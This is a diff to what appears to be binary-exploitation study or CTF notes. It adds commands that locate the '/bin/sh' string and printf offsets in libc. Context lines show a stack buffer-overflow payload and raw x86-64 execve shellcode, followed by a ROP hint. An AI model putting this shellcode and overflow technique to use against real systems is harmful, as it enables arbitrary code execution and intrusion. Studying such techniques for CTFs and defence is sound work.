@@ -106,6 +106,15 @@ payload = shellcode + b"A" * (80 - len(shellcode)) + b"B"*8 + p64(int(buff_addr,
 \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
 ```
 
+### Offset in libc
+```bash
+strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+```
+
+```bash
+readelf -Ws /usr/lib/x86_64-linux-gnu/libc.so.6 | grep printf
+```
+
 
 ### NX enabled
 Try using ropper since it might be an ROP attack
